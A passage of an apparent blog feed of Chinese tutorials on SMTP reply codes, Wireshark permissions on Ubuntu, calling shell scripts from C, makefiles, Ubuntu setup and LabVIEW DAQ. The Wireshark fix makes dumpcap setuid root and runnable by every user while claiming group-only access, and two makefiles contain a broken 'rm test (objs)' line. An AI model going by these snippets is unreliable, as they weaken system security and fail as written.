<h3 id="退出Telnet"><a href="#退出Telnet" class="headerlink" title="退出Telnet"></a>退出Telnet</h3><pre><code class="bash">C quit
S Connection closed by foreign host.
</code></pre>
<p>当邮件发送结束后，客户端通过<code>quit</code>退出<code>Telnet</code>。</p>
<h2 id="SMTP-Code"><a href="#SMTP-Code" class="headerlink" title="SMTP Code"></a>SMTP Code</h2><ul>
<li><code>211</code> 系统状态或系统帮助响应</li>
<li><code>214</code> 帮助信息</li>
<li><code>220</code> 服务就绪</li>
<li><code>221</code> 服务关闭传输信道</li>
<li><code>235</code> 用户验证成功</li>
<li><code>250</code> 要求的邮件操作完成</li>
<li><code>251</code> 用户非本地，将转发向</li>
<li><code>334</code> 等待用户输入验证信息</li>
<li><code>354</code> 开始邮件输入，以单行<strong>.</strong>结束</li>
<li><code>421</code> 服务未就绪，关闭传输信道（当必须关闭时，此应答可以作为对任何命令的响应）</li>
<li><code>450</code> 要求的邮件操作未完成，邮箱不可用（例如，邮箱忙）</li>
<li><code>451</code> 放弃要求的操作；处理过程中出错</li>
<li><code>452</code> 系统存储不足，要求的操作未执行</li>
<li><code>500</code> 格式错误，命令不可识别（此错误也包括命令行过长）</li>
<li><code>501</code> 参数格式错误</li>
<li><code>502</code> 命令不可实现</li>
<li><code>503</code> 错误的命令序列</li>
<li><code>504</code> 命令参数不可实现</li>
<li><code>535</code> 用户验证失败</li>
<li><code>550</code> 要求的邮件操作未完成，邮箱不可用（例如，邮箱未找到，或不可访问）</li>
<li><code>551</code> 用户非本地，请尝试</li>
<li><code>552</code> 过量的存储分配，要求的操作未执行</li>
<li><code>553</code> 邮箱名不可用，要求的操作未执行（例如邮箱格式错误）</li>
<li><code>554</code> 操作失败</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><code>SMTP</code>文档(<code>RFC 821</code>) : <a href="https://tools.ietf.org/pdf/rfc821.pdf" target="_blank" rel="noopener">https://tools.ietf.org/pdf/rfc821.pdf</a></li>
<li><code>SMTP Code</code> : <a href="http://bbs.csdn.net/topics/80275246" target="_blank" rel="noopener">http://bbs.csdn.net/topics/80275246</a></li>
<li><code>163.com</code> 邮件退信代码 : <a href="http://help.163.com/09/1224/17/5RAJ4LMH00753VB8.html" target="_blank" rel="noopener">http://help.163.com/09/1224/17/5RAJ4LMH00753VB8.html</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> telnet </tag>
            
            <tag> smtp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ubuntu下解决wireshark没有权限的问题]]></title>
      <url>https://www.litreily.top/2017/07/28/chmod-wireshark/</url>
      <content type="html"><![CDATA[<p><code>wireshark</code>是常用的网络抓包工具，在<code>ubuntu</code>中安装方法如下：</p>
<pre><code class="bash">sudo aptitude install wireshark
</code></pre>
<p>安装以后，打开软件后，在选择网络接口进行抓包时会提示没有权限，为此，可以通过以下方法解决。</p>
<pre><code class="bash"># 添加用户组，命名为wireshark
sudo groupadd wireshark  

# 将dumpcap更改为刚添加的用户组
sudo chgrp wireshark /usr/bin/dumpcap  

# 为wireshark用户组添加使用dumpcap的root权限
sudo chmod 4755 /usr/bin/dumpcap

# 将自己的用户(本人litreily)添加到wireshark用户组
sudo gpasswd -a litreily wireshark  
</code></pre>
<p>执行完成以后便可以使用<code>wireshark</code>正常抓包了。</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> wireshark </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[C程序与Shell脚本混合编程]]></title>
      <url>https://www.litreily.top/2017/07/27/mixwith-shell/</url>
      <content type="html"><![CDATA[<p>对于嵌入式软件开发，有时候需要在使用<code>C</code>语言进行开发的同时，嵌入<code>shell</code>脚本指令，以完成一些特定的任务。</p>
<p>本文结合上一篇博文“初探makefile”的程序代码，加上一个简单的<code>shell</code>脚本，说明两者混合编程的方法。</p>
<h2 id="编写-shell-脚本"><a href="#编写-shell-脚本" class="headerlink" title="编写 shell 脚本"></a>编写 shell 脚本</h2><pre><code class="bash">vim shell.sh
</code></pre>
<p>使用<code>vim</code>编辑器新建<code>shell.sh</code>脚本文件。</p>
<pre><code class="bash">#!/bin/zsh

echo &quot;Hello world!&quot;
echo &quot;Please input your strings&quot;
read input_string
echo &quot;input_string=$input_string&quot;
</code></pre>
<p>脚本首先输出一个“Hello world!”，然后输出一个字符串输入提示语，等待用户输入后，打印出相应的信息。</p>
<h2 id="在-main-c-中调用-shell-脚本"><a href="#在-main-c-中调用-shell-脚本" class="headerlink" title="在 main.c 中调用 shell 脚本"></a>在 main.c 中调用 shell 脚本</h2><p>为了在<code>C</code>文件中调用<code>shell</code>脚本，可以使用<code>stdlib.h</code>库中的<code>system</code>函数，调用方式如下：</p>
<pre><code class="c">#include &lt;stdlib.h&gt;
...

void func(void)
{
    system(&quot;bash ./&lt;script-filename&gt;.sh&quot;);
    // bash为默认shell，也可改用诸如&quot;zsh&quot;类的shell
}
</code></pre>
<p>根据该用法修改原有的<code>main.c</code></p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &quot;main.h&quot;
#include &quot;add.h&quot;

int main(void)
{
    int a = 10;
    int b = 1;
    int c = add(a,b);

    printf(&quot;%d + %d = %d\n&quot;,a,b,c);
    system(&quot;zsh ./shell.sh&quot;);     // 调用 shell 脚本

    printf(&quot;Infos:File-%s, Func-%s, Line-%d\n&quot;,__FILE__,__func__,__LINE__);
    /*
    __FILE__ : 文件名
    __func__ : 函数名
    __LINE__ : 所在行
    */

    return 0;
}
</code></pre>
<h2 id="编译链接并执行"><a href="#编译链接并执行" class="headerlink" title="编译链接并执行"></a>编译链接并执行</h2><pre><code class="bash">$ make clean                # 清除目标文件
rm test main.o add.o

$ make                      # 生成可执行文件
cc    -c -o main.o main.c
cc    -c -o add.o add.c
cc -o test main.o add.o

$ ./test                    # 执行可执行文件
10 + 1 = 11                 # 加法运算结果
Hello world!                # shell 脚本欢迎语
Please input your strings   # 提示语
whatever                    # 手动输入的信息  
input_string=whatever       # 显示信息
Infos:File-main.c, Func-main, Line-14   # 显示打印程序所在文件、函数及对应行数
</code></pre>
<p><strong>说明</strong>：当使用<code>printf</code>函数时，如果不在输出信息后添加<code>\n</code>换行符的话，其输出信息有可能与<code>shell</code>脚本执行结果发生错位。为避免该情况的发生，应习惯在<code>printf</code>函数调用过程中加入换行符。</p>
<h2 id="显示脚本指令"><a href="#显示脚本指令" class="headerlink" title="显示脚本指令"></a>显示脚本指令</h2><p>为了追踪每个脚本指令的执行过程，可以修改<code>system</code>函数调用方式，在<code>bash</code>,<code>zsh</code>后添加选项<code>-x</code>.</p>
<pre><code class="c">system(&quot;zsh -x ./shell.sh&quot;);
</code></pre>
<p>修改后重新执行make，执行<code>./test</code>得到以下结果</p>
<pre><code class="zsh">$ ./test
10 + 1 = 11
+/etc/zsh/zshenv:15&gt; [[ -z /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin || /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin == /bin:/usr/bin ]]

+./shell.sh:3&gt; echo &#39;Hello world!&#39;
Hello world!

+./shell.sh:4&gt; echo &#39;Please input your strings&#39;
Please input your strings

+./shell.sh:5&gt; read input_string
what

+./shell.sh:6&gt; echo &#39;input_string=what&#39;
input_string=what

Infos:File-main.c, Func-main, Line-14
</code></pre>
<p>使用不同的<code>shell</code>，其显示效果不大一致，下面是使用<code>bash</code>执行后的效果。</p>
<pre><code class="bash">$ ./test
10 + 1 = 11

+ echo &#39;Hello world!&#39;
Hello world!

+ echo &#39;Please input your strings&#39;
Please input your strings

+ read input_string
what

+ echo input_string=what
input_string=what

Infos:File-main.c, Func-main, Line-14
</code></pre>
<p><strong>说明</strong>：上述执行过程中显示的空行是为了清楚显示执行过程手动添加的，实际执行过程中并无空行。</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> ubuntu </tag>
            
            <tag> makefile </tag>
            
            <tag> shell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[初探makefile]]></title>
      <url>https://www.litreily.top/2017/07/25/makefile/</url>
      <content type="html"><![CDATA[<p>嵌入式软件开发少不了使用makefile进行软件编译，写好一个makefile，让其完成所有程序代码的自动化编译链接，可以提高软件开发效率。<code>make</code>是一个命令工具，用于解释并执行makefile中的指令。大多数IDE都有这个命令工具，如<code>Visual C++</code>的<code>nmake</code>，<code>Linux</code>中<code>GNU</code>的<code>make</code>。本文以一个简单例子说明<code>makefile</code>文件的书写规范和执行过程。</p>
<h2 id="创建待编译的文件"><a href="#创建待编译的文件" class="headerlink" title="创建待编译的文件"></a>创建待编译的文件</h2><pre><code class="bash">mkdir mkfiles
vim add.h add.c main.h main.c
</code></pre>
<p>然后逐个编辑头文件和源文件，实现一个简单的加法运算。</p>
<h3 id="add-h"><a href="#add-h" class="headerlink" title="add.h"></a>add.h</h3><p>加法函数放于<code>add.c</code>中，对应头文件为<code>add.h</code>，用于存放函数声明。</p>
<pre><code class="c">#ifndef __ADD_H_
#define __ADD_H_

// declaration functions
int add(int a,int b);

#endif // __ADD_H_
</code></pre>
<h3 id="add-c"><a href="#add-c" class="headerlink" title="add.c"></a>add.c</h3><p>在<code>add.c</code>中实现加法函数。</p>
<pre><code class="c">#include &quot;add.h&quot;

int add(int a, int b)
{
  return a+b;
}
</code></pre>
<h3 id="main-h"><a href="#main-h" class="headerlink" title="main.h"></a>main.h</h3><p>在主函数对应的头文件<code>main.h</code>中添加依赖的头文件。</p>
<pre><code class="c">#ifndef __MAIN_H_
#define __MAIN_H_

#include &lt;math.h&gt;

#endif // __MAIN_H_
</code></pre>
<h3 id="main-c"><a href="#main-c" class="headerlink" title="main.c"></a>main.c</h3><p>在<code>main.c</code>中实现主函数，打印出一个加法运算结果。</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &quot;main.h&quot;
#include &quot;add.h&quot;

int main(void)
{
  int a = 10;
  int b = 1;
  int c = add(a,b);
  printf(&quot;%d + %d = %d\n&quot;,a,b,c);
  return 0;
}
</code></pre>
<h2 id="创建-makefile"><a href="#创建-makefile" class="headerlink" title="创建 makefile"></a>创建 makefile</h2><h3 id="makefile-规则"><a href="#makefile-规则" class="headerlink" title="makefile 规则"></a>makefile 规则</h3><pre><code class="bash">target ... : prerequisites ...
&lt;tab&gt;   command

...
...
</code></pre>
<p><code>target</code>: 目标文件，可以是.o（object file）文件，也可以是最终的可执行文件<br><code>prerequisites</code> : 生成目标文件所需的文件或是目标（<code>*.h</code>, <code>*.c</code>, <code>*.o</code>, ...）<br><code>command</code>: <code>make</code>需要执行的编译、链接等指令（所有指令前都以<code>TAB</code>键开头）</p>
<h3 id="makefile-基础写法"><a href="#makefile-基础写法" class="headerlink" title="makefile 基础写法"></a>makefile 基础写法</h3><pre><code class="makefile">test : main.o add.o
cc -o test main.o add.o

main.o : main.c main.h add.h
cc -c main.c

add.o : add.c add.h
cc -c add.c

# make clean : use to clean all the object files

.PHONY : clean
clean :
rm test main.o add.o
</code></pre>
<p>其中，test, main.o, add.o均是目标文件<code>target</code>；所有源文件及头文件均为<code>prerequisites</code>；</p>
<p><code>cc</code> : 编译器，与<code>gcc</code>相似，<code>-c</code>代表编译，执行后产生对象文件，即&quot;.o&quot;文件；<code>-o</code>代表链接，用于链接&quot;.o&quot;文件并生成可执行文件；</p>
<p><code>.PHONY</code> : 用于声明后面跟着的都是伪目标（类似于C语言中的标签(Label)）；</p>
<p><code>clean</code> ： 一个伪目标，只有在外部执行<code>make clean</code>时方才执行相应的执行，此次用于删除生成的所有目标文件。</p>
<h3 id="makefile-简化版1"><a href="#makefile-简化版1" class="headerlink" title="makefile 简化版1"></a>makefile 简化版1</h3><p>在<code>makefile</code>中可以通过<code>$</code>符号引用变量，简化文件。变量定义以等号连接，类似于宏定义，将需要多处使用的字符串存入变量中可以方便修改和管理，如本例，可定义以下变量：</p>
<pre><code class="makefile">objs = main.o add.o  # 引用方法 $(objs)
</code></pre>
<p>简化后的<code>makefile</code>如下：</p>
<pre><code class="makefile">objs = main.o add.o
test : $(objs)
cc -o test $(objs)

main.o : main.c main.h add.h
cc -c main.c

add.o : add.c add.h
cc -c add.c

# make clean : use to clean all the object files

.PHONY : clean
clean :
rm test (objs)
</code></pre>
<p>当项目文件很多时，合理使用变量可以大大简化<code>makefile</code>的编写和修改。</p>
<h3 id="makefile-简化版2"><a href="#makefile-简化版2" class="headerlink" title="makefile 简化版2"></a>makefile 简化版2</h3><p>要知道，<code>make</code>非常强大，具有<strong>自动推导</strong>的功能，可以自动推导&quot;.o&quot;目标文件下面的指令。如果目标文件为&quot;main.o&quot;，那么指令必然为&quot;cc -c main.c&quot;，依赖于<code>make</code>指令的推导功能，<code>makefile</code>可以省略该指令的编写。</p>
<p>此外，每个&quot;.o&quot;目标文件的依赖文件必然包含一个文件名相同的&quot;.c&quot;文件，该文件可以通过自动推导得出，所以在<code>makefile</code>中同样可以省略。</p>
<p>根据以上规则可以对<code>makefile</code>进一步简化：</p>
<pre><code class="makefile">objs = main.o add.o
test : $(objs)
cc -o test $(objs)

main.o : main.h add.h
add.o : add.h

# make clean : use to clean all the object files

.PHONY : clean
clean :
rm test (objs)
</code></pre>
<h2 id="make"><a href="#make" class="headerlink" title="make"></a>make</h2><p>编写好<code>makefile</code>文件后，便可以使用<code>make</code>指令进行编译链接并生成可执行文件了。</p>
<pre><code class="bash">$ make  # 生成可执行文件
cc -c main.c
cc -c add.c
cc -o test main.o add.o
$ ls
add.c  add.h  add.o  main.c  main.h  main.o  makefile  test
$ ./test  # 执行可执行文件
10 + 1 = 11
$ make clean  # 清除所有目标文件
rm test main.o add.o
$ ls
add.c  add.h  main.c  main.h  makefile
</code></pre>
<p>至此，一个简单的<code>makefile</code>编写过程及执行过程便结束了。</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> ubuntu </tag>
            
            <tag> makefile </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[安装Ubuntu后的系统精简与美化]]></title>
      <url>https://www.litreily.top/2017/06/11/initial-ubuntu/</url>
      <content type="html"><![CDATA[<p>安装好Ubuntu系统后，通常需要卸载许多用不上的软件，并安装一些常用以及实用的软件。当然，Ubuntu默认的主题实在不敢恭维，为此有必要换一套主题予以美化。</p>
<h2 id="系统精简"><a href="#系统精简" class="headerlink" title="系统精简"></a>系统精简</h2><p>删除不必要的软件</p>
<h3 id="删除libreoffice"><a href="#删除libreoffice" class="headerlink" title="删除libreoffice"></a>删除libreoffice</h3><pre><code class="bash">sudo apt-get remove libreoffice-common
</code></pre>
<h3 id="删除Amazon链接"><a href="#删除Amazon链接" class="headerlink" title="删除Amazon链接"></a>删除Amazon链接</h3><pre><code class="bash">sudo apt-get remove unity-webapps-common
</code></pre>
<h3 id="删除其它极少用的软件"><a href="#删除其它极少用的软件" class="headerlink" title="删除其它极少用的软件"></a>删除其它极少用的软件</h3><pre><code class="bash">sudo apt-get remove thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot gnome-mines cheese transmission-common gnome-orca webbrowser-app gnome-sudoku
sudo apt-get remove onboard deja-dup
</code></pre>
<h2 id="常用软件安装"><a href="#常用软件安装" class="headerlink" title="常用软件安装"></a>常用软件安装</h2><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><pre><code class="bash">sudo apt-get install vim    # Vim
sudo apt-get install git    # Git
</code></pre>
<p>安装<code>Git</code>之后需要配置以下全局变量，并生成<code>ssh-key</code></p>
<pre><code class="bash">git config --global user.email &quot;emailname@email.com&quot;
git config --global user.name &quot;username&quot;
ssh-keygen -t rsa -C &quot;emailname@email.com&quot;
cd ~/.ssh
gedit id_rsa.pub    # 将文件内容添加至github或其它代码托管平台
</code></pre>
<h3 id="系统指示器Syspeek"><a href="#系统指示器Syspeek" class="headerlink" title="系统指示器Syspeek"></a>系统指示器Syspeek</h3><pre><code class="bash">sudo add-apt-repository ppa:nilarimogard/webupd8
sudo apt-get update
sudo apt-get install syspeek  
</code></pre>
<h3 id="Hexo-amp-amp-Gitbook"><a href="#Hexo-amp-amp-Gitbook" class="headerlink" title="Hexo &amp;&amp; Gitbook"></a>Hexo &amp;&amp; Gitbook</h3><p>首先安装<code>node.js</code>与<code>npm</code>,然后使用<code>npm</code>安装<code>hexo</code>与<code>gitbook</code></p>
<pre><code class="bash">npm install hexo-cli -g
npm install -g gitbook-cli
gitbook -V
</code></pre>
<h3 id="必备软件"><a href="#必备软件" class="headerlink" title="必备软件"></a>必备软件</h3><ul>
<li>汉字输入法： 搜狗拼音</li>
<li>音乐播放器： 网易云音乐</li>
</ul>
<pre><code class="bash">sudo dpkg -i netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb   # 下载安装包后执行该指令
sudo apt-get -f install
</code></pre>
<ul>
<li>视频播放器： VLC（自带software 管理软件中下载安装）</li>
<li>网络浏览器： Google Chrome</li>
</ul>
<pre><code class="bash">sudo dpkg -i google-chrome-stable_current_amd64.deb   # 下载安装包后执行该指令
sudo apt-get -f install
</code></pre>
<ul>
<li>截图软件： Shutter</li>
<li>社交软件： <a href="https://github.com/geeeeeeeeek/electronic-wechat.git" target="_blank" rel="noopener">微信</a></li>
<li>办公软件： WPS</li>
</ul>
<h2 id="系统美化"><a href="#系统美化" class="headerlink" title="系统美化"></a>系统美化</h2><p>参考资料：<a href="http://www.jcodecraeer.com/plus/view.php?aid=3502" target="_blank" rel="noopener">http://www.jcodecraeer.com/plus/view.php?aid=3502</a></p>
<h3 id="安装Flatabulous主题"><a href="#安装Flatabulous主题" class="headerlink" title="安装Flatabulous主题"></a>安装Flatabulous主题</h3><ul>
<li>首先安装 Unity-tweak-tool软件（从Ubuntu软件商店可以找到）</li>
<li>然后在<code>~</code>目录下创建系统主题文件夹<code>.themes</code></li>
</ul>
<pre><code class="bash">mkdir ~/.themes
</code></pre>
<ul>
<li>在<a href="https://github.com/anmoljagetia/Flatabulous/archive/master.zip" target="_blank" rel="noopener">https://github.com/anmoljagetia/Flatabulous/archive/master.zip</a> 下载 Flatabulous 主题</li>
<li>解压主题后移动到<code>~/.themes</code>文件夹下</li>
<li>打开tweak软件，在theme面板中选择Flatabulous主题</li>
</ul>
<h3 id="安装ultra-flat-icons图标主题"><a href="#安装ultra-flat-icons图标主题" class="headerlink" title="安装ultra-flat-icons图标主题"></a>安装ultra-flat-icons图标主题</h3><ul>
<li>安装图标主题</li>
</ul>
<pre><code class="bash">sudo add-apt-repository ppa:noobslab/icons  
sudo apt-get update  
sudo apt-get install ultra-flat-icons
</code></pre>
<ul>
<li>在tweak软件中的icon面板中选择Ultra-flat</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Labview - DAQ 助手详解]]></title>
      <url>https://www.litreily.top/2017/04/24/labview-DAQ/</url>
      <content type="html"><![CDATA[<h2 id="DAQ-助手简介"><a href="#DAQ-助手简介" class="headerlink" title="DAQ 助手简介"></a>DAQ 助手简介</h2><h3 id="Express-VI"><a href="#Express-VI" class="headerlink" title="Express VI"></a>Express VI</h3><p><code>Express VI</code> 是 LabVIEW 7 及更高版本拥有的快速 VI，此类 VI 将一些常见的功能打包，然后封装在简单易用的交互式的 VI 程序中，方便开发人员配置参数和实现功能。</p>
<p><code>DAQ</code> 助手是完成信号采集任务的常用工具，以 <code>Express VI</code> 的形式呈现，具有交互式的配置界面，配合 NI 公司提供的采集卡，可以完成绝大部分的信号采集任务。</p>
<h3 id="使用方法简述（采集-AI-信号）"><a href="#使用方法简述（采集-AI-信号）" class="headerlink" title="使用方法简述（采集 AI 信号）"></a>使用方法简述（采集 AI 信号）</h3><h4 id="选择信号类型"><a href="#选择信号类型" class="headerlink" title="选择信号类型"></a>选择信号类型</h4><p><img src="/assets/labview/daqAssistant/selectSignal.png" alt="DAQ助手信号类型选择界面"></p>
<p>在采集卡（虚拟的或实际的均可）已连接的情况下，从 VI 的程序框图中打开 <code>DAQ</code> 助手，选择待采集信号的类型，此处选择模拟输入电压信号。</p>
<h4 id="选择物理通道"><a href="#选择物理通道" class="headerlink" title="选择物理通道"></a>选择物理通道</h4><p><img src="/assets/labview/daqAssistant/selectChannel.png" alt="DAQ助手物理通道选择界面"></p>
<p>选择通道时，按住<code>Ctrl</code> 或 <code>Shift</code> 可同时选择多路通道</p>
<h4 id="配置信号采集参数"><a href="#配置信号采集参数" class="headerlink" title="配置信号采集参数"></a>配置信号采集参数</h4><p><img src="/assets/labview/daqAssistant/daqConfig.png" alt="DAQ助手通道配置界面"></p>
<p>配置界面中可以进行物理通道的删除与添加，通道名称的修改，接线端连接方式的选择，采集模式的选择等操作，配置界面右侧对于每个选项都有详细说明。</p>
<p>信号采集模式包含“1 采样”、“N 采样”和“连续采样” 3 大类。对于连续采样而言，采样率决定了信号采样的间隔时间，通常将其设为最大有效信号频率的 10 倍左右；采样点数指定了连续采样时的数据缓冲区大小，简单来说，就是每次采样后得到的待处理数据长度，待读取采样与采样率之比就是连续采样的间隔时间。</p>
<p>此外，信号输入范围默认为 <code>-10~10v</code> ；接线端配置默认为差分输入，通常情况下，我们会选择单端输入 <code>RSE</code>，表示一端接 <code>AGND</code>，一端接输入端口，不同的接线端配置方式对应的连线图也不一致，在进行信号端口连线时需要按所选方式进行连接。</p>
<h4 id="启用-TDMS-记录"><a href="#启用-TDMS-记录" class="headerlink" title="启用 TDMS 记录"></a>启用 TDMS 记录</h4><p><img src="/assets/labview/daqAssistant/saveTdms.png" alt="DAQ助手启用TDMS记录"></p>
<p>在配置界面中，还可以选择是否将采集的数据记录至 <code>TDMS</code> 文件中，同时可以选择好默认的存储路径、记录模式和组名。如果信号采集结束后需要实时处理，需要将记录模式设为“记录并读取”，如果仅仅是记录而无需处理，则选择“仅记录”。组名将会显示在 <code>TDMS</code> 文件的分组列表中。</p>
<p>如果记录时间很长，长达几个小时甚至几天时，此时由于数据量过大，可以勾选“包含多个文件”，并规定单个文件的存储容量。</p>
<h4 id="配置接口"><a href="#配置接口" class="headerlink" title="配置接口"></a>配置接口</h4><p><img src="/assets/labview/daqAssistant/daqIcon.png" alt="DAQ助手配置完成图"></p>
<p>当采集信息确定好以后，会在程序框图中生成相应的 <code>DAQ</code> 图标，后续如果需要更改参数，可以参考以下两种方法：</p>
<ol>
<li>双击 <code>DAQ</code> 助手，打开配置界面更改需要更新的参数</li>
<li>通过 <code>DAQ</code> 助手提供的输入接口，从前面板或程序框图修改相应参数</li>
</ol>
<h2 id="DAQ-助手程序解析"><a href="#DAQ-助手程序解析" class="headerlink" title="DAQ 助手程序解析"></a>DAQ 助手程序解析</h2><p>对 <code>Express VI</code> 而言，双击无法打开程序框图，打开的是配置界面。此外，<code>Express VI</code> 的程序是动态的，对于 <code>DAQ</code> 助手而言，选择不同的通道数，不同的信号类型，其产生的执行程序都不一样。下面以双通道连续采集模拟输入电压信号为例，解析 <code>DAQ</code> 助手的内部执行程序。</p>
<h3 id="Express-VI-转标准子-VI"><a href="#Express-VI-转标准子-VI" class="headerlink" title="Express VI 转标准子 VI"></a>Express VI 转标准子 VI</h3><p>想要查看 <code>DAQ</code> 助手的程序框图，必须先将其转换为标准子 VI，转换方法很简单，选择 <code>DAQ</code> 助手，右键选择“打开前面板”或“open front panel”（英文版）。</p>
<h3 id="整体程序框图"><a href="#整体程序框图" class="headerlink" title="整体程序框图"></a>整体程序框图</h3><p><img src="/assets/labview/daqAssistant/daqDiagram.png" alt="DAQ助手程序框图"></p>
<p>上图是 <code>DAQ</code> 助手的程序框图，可简化为如下图所示的程序流程图，图中的一对移位寄存器代指的是信号采集任务句柄。</p>
<p><img src="/assets/labview/daqAssistant/daqDiagram_visio.png" alt="DAQ助手程序框图"></p>
<h3 id="程序解析"><a href="#程序解析" class="headerlink" title="程序解析"></a>程序解析</h3><p>下面对以上程序框图中的每个模块进行详细分析。</p>
<h4 id="创建采集任务"><a href="#创建采集任务" class="headerlink" title="创建采集任务"></a>创建采集任务</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_1.png" alt="DAQ助手局部程序框图1"></p>
<p>图中包含两个移位寄存器，上面的寄存器用于存储采集任务的引用句柄，当该句柄无效或首次调用该 VI 时会执行 <code>DAQmx Create Task</code> 函数，即创建新的采集任务，并产生新任务的引用句柄。</p>
<h4 id="生成通道名称"><a href="#生成通道名称" class="headerlink" title="生成通道名称"></a>生成通道名称</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_2.png" alt="DAQ助手局部程序框图2"></p>
<p>添加物理通道前，需要选择好相应的通道名称，模拟输入信号简称 <code>ai</code>，通道名称格式为 <code>ain</code>, n 从 0 开始增加。在此例中，所选通道为 <code>ai0</code> 与 <code>ai1</code>。设备名为 <code>Dev1</code>,所以最终得到的通道名称为 <code>Dev1/ai0</code> 与 <code>Dev1/ai1</code>。正常情况下，该条件结构内的程序仅在首次调用时执行一次。</p>
<h4 id="添加物理通道"><a href="#添加物理通道" class="headerlink" title="添加物理通道"></a>添加物理通道</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_3.png" alt="DAQ助手局部程序框图3"></p>
<p>确定好通道名称后，便可根据需求添加相应的物理通道了，如图所示，标志 ① 连接的是输入接线端配置参数，往下的参数可以参考如下的函数 <code>IO</code> 接口图。之所以用 <code>for</code> 循环，是因为每个采集通道均需调用一次 <code>DAQmx Create Channel</code> 函数。本例创建的通道数为 2，所以 <code>for</code> 循环的执行次数为 2。</p>
<p><img src="/assets/labview/daqAssistant/daqDiagram_3_1.png" alt="DAQ助手局部程序框图3-1"></p>
<h4 id="配置采样时钟"><a href="#配置采样时钟" class="headerlink" title="配置采样时钟"></a>配置采样时钟</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_4.png" alt="DAQ助手局部程序框图4"></p>
<p>对于连续采样模式，必须调用 <code>DAQmx Timing</code> 定时函数，配置好采样率和采样点数。但在此处需要注意的是，<code>DAQ</code> 助手并没有实现采集过程中修改采样频率 <code>Sample rate</code> 的功能，也就是说：在信号采集过程中，无法修改采样频率，直到采集任务出错或停止。如果实际应用中有采集过程中修改采样率的需求，只能另行编写采集程序，这也是 <code>Express VI</code> 不够灵活的一个体现。</p>
<h4 id="配置-TDMS-记录"><a href="#配置-TDMS-记录" class="headerlink" title="配置 TDMS 记录"></a>配置 TDMS 记录</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_5.png" alt="DAQ助手局部程序框图5"></p>
<p><code>TDMS</code> 文件记录是非常常用的功能，可以将采集到的信号快速存储至 <code>.tdms</code> 文件中。使用 <code>DAQmx Configure Logging(TDMS)</code> 函数配置 <code>TDMS</code> 记录功能时，可参考如下接口，设置好记录模式、组名、文件路径等。</p>
<p><img src="/assets/labview/daqAssistant/daqDiagram_5_1.png" alt="DAQ助手局部程序框图5-1"></p>
<h4 id="开始任务"><a href="#开始任务" class="headerlink" title="开始任务"></a>开始任务</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_6.png" alt="DAQ助手局部程序框图6"></p>
<p>当采集任务相关的参数都配置完成后，即可开始任务 <code>DAQmx Start Task</code>。</p>
<p>此前 6 个步骤仅需执行一次，直到下一次重启软件或出现异常。</p>
<h4 id="信号采集"><a href="#信号采集" class="headerlink" title="信号采集"></a>信号采集</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_7.png" alt="DAQ助手局部程序框图7"></p>
<p>开始任务后，物理采集卡就将按照给定的参数开始采集，并将数据存放至采集卡内的缓冲区内，通过相应的 <code>DAQmx Read</code> 函数，选择合适的采样方式（此处选为“模拟1D波形N通道N采样”）， <code>DAQ</code> 驱动程序便会从采集卡的缓冲区中读取数据，并默认以动态数据格式 DDT(Dynamic Data Type) 输出。<code>DAQ</code> 助手返回的动态数据便是该函数返回的数据 <code>data</code>。</p>
<h4 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_8.png" alt="DAQ助手局部程序框图8"></p>
<p>所谓异常处理，指的注意异常情况是采集卡在信号采集过程中被拔出，导致采集任务无法继续执行，此时 <code>DAQ</code> 助手将会停止并清除任务，并将任务的引用句柄重置为空。下一次 while 循环将判断出该空句柄，然后重新创建任务，如果采集任务被顺利创建，说明异常已解除，采集卡已重新连接，采集任务便可自动继续进行；如果采集任务创建失败，则循环创建任务直到成功为止。</p>
<p>当然还有一种非异常情况也会停止并清除任务，那就是用户手动点击停止按钮 stop ，任务正常终止。</p>
<h2 id="DAQ-助手程序简化"><a href="#DAQ-助手程序简化" class="headerlink" title="DAQ 助手程序简化"></a>DAQ 助手程序简化</h2><p>从上面的解析可以看出，<code>DAQ</code> 助手作为通用型工具，包含了所有需要的配置参数。<code>DAQ</code> 助手有其方便之处，但同时也存在许多不灵活的地方：</p>
<ol>
<li>经测试，对于单通道和 N 通道的采集任务，DAQ 助手的执行程序结构完全一致，生成通道名称和添加物理通道均采用了 for 循环结构，这对单通道采集原本是不需要的；</li>
<li>实际应用中，添加物理通道时，有许多参数使用默认值即可，过多的参数只会使代码显得冗余；</li>
<li>上述提及的一个问题：无法在采集过程中修改采样率；</li>
